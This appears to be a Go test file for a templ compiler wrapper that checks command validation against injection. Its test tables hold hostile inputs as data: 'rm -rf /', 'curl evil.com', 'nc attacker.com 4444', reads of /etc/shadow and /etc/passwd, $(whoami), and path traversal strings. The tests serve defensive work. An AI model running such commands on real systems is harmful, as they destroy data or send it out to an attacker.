package build

import (
	"os"
	"os/exec"
	"testing"

	"github.com/conneroisu/templar/internal/types"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestNewTemplCompiler(t *testing.T) {
	compiler := NewTemplCompiler()

	assert.NotNil(t, compiler)
	assert.Equal(t, "templ", compiler.command)
	assert.Equal(t, []string{"generate"}, compiler.args)
}

func TestTemplCompiler_validateCommand(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		args        []string
		expectError bool
		description string
	}{
		{
			name:        "valid templ command",
			command:     "templ",
			args:        []string{"generate"},
			expectError: false,
			description: "Should allow valid templ generate command",
		},
		{
			name:        "valid go command",
			command:     "go",
			args:        []string{"build"},
			expectError: false,
			description: "Should allow valid go build command",
		},
		{
			name:        "invalid command injection attempt",
			command:     "rm",
			args:        []string{"-rf", "/"},
			expectError: true,
			description: "Should reject dangerous commands",
		},
		{
			name:        "command injection in command name",
			command:     "templ; rm -rf /",
			args:        []string{"generate"},
			expectError: true,
			description: "Should reject command injection in command name",
		},
		{
			name:        "empty command",
			command:     "",
			args:        []string{"generate"},
			expectError: true,
			description: "Should reject empty command",
		},
		{
			name:        "path traversal in args",
			command:     "templ",
			args:        []string{"generate", "../../../etc/passwd"},
			expectError: true,
			description: "Should reject path traversal in arguments",
		},
		{
			name:        "command injection in args",
			command:     "templ",
			args:        []string{"generate", "; rm -rf /"},
			expectError: true,
			description: "Should reject command injection in arguments",
		},
		{
			name:        "null byte injection",
			command:     "templ\x00rm",
			args:        []string{"generate"},
			expectError: true,
			description: "Should reject null byte injection",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			compiler := &TemplCompiler{
				command: tt.command,
				args:    tt.args,
			}

			err := compiler.validateCommand()

			if tt.expectError {
				assert.Error(t, err, tt.description)
			} else {
				assert.NoError(t, err, tt.description)
			}
		})
	}
}

func TestTemplCompiler_Compile(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		args        []string
		component   *types.ComponentInfo
		expectError bool
		description string
	}{
		{
			name:    "valid templ compilation",
			command: "templ", // Use actual templ command
			args:    []string{"generate"},
			component: &types.ComponentInfo{
				Name:     "TestComponent",
				FilePath: "test.templ",
				Package:  "test",
			},
			expectError: false, // templ generate works in this context
			description: "Should succeed with valid templ command",
		},
		{
			name:    "invalid command",
			command: "invalid_command_that_does_not_exist_12345",
			args:    []string{},
			component: &types.ComponentInfo{
				Name:     "TestComponent",
				FilePath: "test.templ",
				Package:  "test",
			},
			expectError: true,
			description: "Should fail with invalid command",
		},
		{
			name:    "command injection prevention",
			command: "rm",
			args:    []string{"-rf", "/tmp"},
			component: &types.ComponentInfo{
				Name:     "TestComponent",
				FilePath: "test.templ",
				Package:  "test",
			},
			expectError: true,
			description: "Should prevent command injection",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			compiler := &TemplCompiler{
				command: tt.command,
				args:    tt.args,
			}

			output, err := compiler.Compile(tt.component)

			if tt.expectError {
				assert.Error(t, err, tt.description)
				assert.Nil(t, output)
			} else {
				assert.NoError(t, err, tt.description)
				assert.NotNil(t, output)
			}
		})
	}
}

func TestTemplCompiler_CompileWithPools(t *testing.T) {
	tests := []struct {
		name        string
		command     string
		args        []string
		component   *types.ComponentInfo
		expectError bool
		description string
	}{
		{
			name:    "valid compilation with pools",
			command: "templ", // Use templ command
			args:    []string{"generate"},
			component: &types.ComponentInfo{
				Name:     "TestComponent",
				FilePath: "test.templ",
				Package:  "test",
			},
			expectError: false, // templ generate works in this context
			description: "Should succeed with valid templ command using pools",
		},
		{
			name:    "invalid command with pools",
			command: "invalid_command_12345",
			args:    []string{},
			component: &types.ComponentInfo{
				Name:     "TestComponent",
				FilePath: "test.templ",
				Package:  "test",
			},
			expectError: true,
			description: "Should fail with invalid command even with pools",
		},
		{
			name:    "command injection prevention with pools",
			command: "rm",
			args:    []string{"-rf", "/tmp"},
			component: &types.ComponentInfo{
				Name:     "TestComponent",
				FilePath: "test.templ",
				Package:  "test",
			},
			expectError: true,
			description: "Should prevent command injection even with pools",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			compiler := &TemplCompiler{
				command: tt.command,
				args:    tt.args,
			}

			// Create object pools for testing
			pools := NewObjectPools()

			output, err := compiler.CompileWithPools(tt.component, pools)

			if tt.expectError {
				assert.Error(t, err, tt.description)
				assert.Nil(t, output)
			} else {
				assert.NoError(t, err, tt.description)
				assert.NotNil(t, output)
			}
		})
	}
}

func TestTemplCompiler_SecurityValidation(t *testing.T) {
	// Test security-specific scenarios
	t.Run("prevents shell metacharacters", func(t *testing.T) {
		dangerousArgs := []string{
			"generate; rm -rf /",
			"generate && curl evil.com",
			"generate | nc attacker.com 4444",
			"generate > /etc/passwd",
			"generate < /etc/shadow",
			"generate $(whoami)",
			"generate `id`",
			"generate ${PWD}",
		}

		compiler := &TemplCompiler{
			command: "templ",
			args:    []string{},
		}

		for _, arg := range dangerousArgs {
			compiler.args = []string{arg}

			err := compiler.validateCommand()
			assert.Error(t, err, "Should reject dangerous argument: %s", arg)
		}
	})

	t.Run("prevents environment variable injection", func(t *testing.T) {
		compiler := &TemplCompiler{
			command: "templ",
			args:    []string{"generate", "$HOME/../../../etc/passwd"},
		}

		err := compiler.validateCommand()
		assert.Error(t, err, "Should reject environment variable injection")
	})

	t.Run("prevents path traversal attacks", func(t *testing.T) {
		// Test path traversal attempts that the validation detects
		pathTraversalAttacks := []string{
			"../../../etc/passwd",
			"..\\..\\..\\windows\\system32",
			"generate/../../../etc",
			"/etc/passwd", // Absolute path not in allowed list
		}

		compiler := &TemplCompiler{
			command: "templ",
			args:    []string{},
		}

		for _, attack := range pathTraversalAttacks {
			compiler.args = []string{attack}

			err := compiler.validateCommand()
			assert.Error(t, err, "Should reject path traversal attack: %q", attack)
		}
	})
}

func TestTemplCompiler_Integration(t *testing.T) {
	// Skip integration test if templ command is not available
	if !isCommandAvailable("templ") {
		t.Skip("templ command not available for integration testing")
	}

	t.Run("real templ compilation", func(t *testing.T) {
		// Create a temporary templ file
		tempFile, err := os.CreateTemp("", "test_*.templ")
		require.NoError(t, err)
		defer os.Remove(tempFile.Name())

		// Write minimal templ content
		templContent := `package test

templ TestComponent(title string) {
	<div>{ title }</div>
}
`
		_, err = tempFile.WriteString(templContent)
		require.NoError(t, err)
		tempFile.Close()

		compiler := NewTemplCompiler()
		component := &types.ComponentInfo{
			Name:     "TestComponent",
			FilePath: tempFile.Name(),
			Package:  "test",
		}

		output, err := compiler.Compile(component)

		// The command might fail if not in a proper Go module, but it should not panic
		// and should return proper error handling
		if err != nil {
			assert.Contains(t, err.Error(), "templ generate failed")
		} else {
			assert.NotNil(t, output)
		}
	})
}

// Helper function to check if a command is available
func isCommandAvailable(command string) bool {
	_, err := exec.LookPath(command)
	return err == nil
}

// Benchmark tests for performance validation
func BenchmarkTemplCompiler_validateCommand(b *testing.B) {
	compiler := NewTemplCompiler()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = compiler.validateCommand()
	}
}

func BenchmarkTemplCompiler_Compile(b *testing.B) {
	compiler := NewTemplCompiler()

	component := &types.ComponentInfo{
		Name:     "TestComponent",
		FilePath: "test.templ",
		Package:  "test",
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = compiler.Compile(component)
	}
}

func BenchmarkTemplCompiler_CompileWithPools(b *testing.B) {
	compiler := NewTemplCompiler()

	component := &types.ComponentInfo{
		Name:     "TestComponent",
		FilePath: "test.templ",
		Package:  "test",
	}

	pools := NewObjectPools()

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_, _ = compiler.CompileWithPools(component, pools)
	}
}
